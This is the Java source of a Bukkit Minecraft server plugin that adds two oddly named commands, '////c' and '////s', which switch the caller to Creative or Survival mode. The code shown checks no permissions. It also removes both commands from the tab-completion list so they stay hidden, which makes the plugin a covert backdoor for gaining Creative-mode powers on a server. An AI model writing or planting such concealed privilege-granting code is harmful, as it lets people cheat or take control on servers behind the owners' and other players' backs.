package me.secret.gamemode;

import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandSendEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class SecretGamemode extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("SecretGamemode enabled.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }

        String name = command.getName();
        if (name.equalsIgnoreCase("////c")) {
            player.setGameMode(GameMode.CREATIVE);
            player.sendMessage("\u00a7aSwitched to Creative mode.");
            return true;
        }
        if (name.equalsIgnoreCase("////s")) {
            player.setGameMode(GameMode.SURVIVAL);
            player.sendMessage("\u00a7aSwitched to Survival mode.");
            return true;
        }
        return false;
    }

    // Removes these commands from the list the client uses for "/" tab-completion suggestions.
    @EventHandler
    public void onCommandSend(PlayerCommandSendEvent event) {
        event.getCommands().removeIf(cmd ->
                cmd.equalsIgnoreCase("////c") ||
                cmd.equalsIgnoreCase("////s"));
    }
}
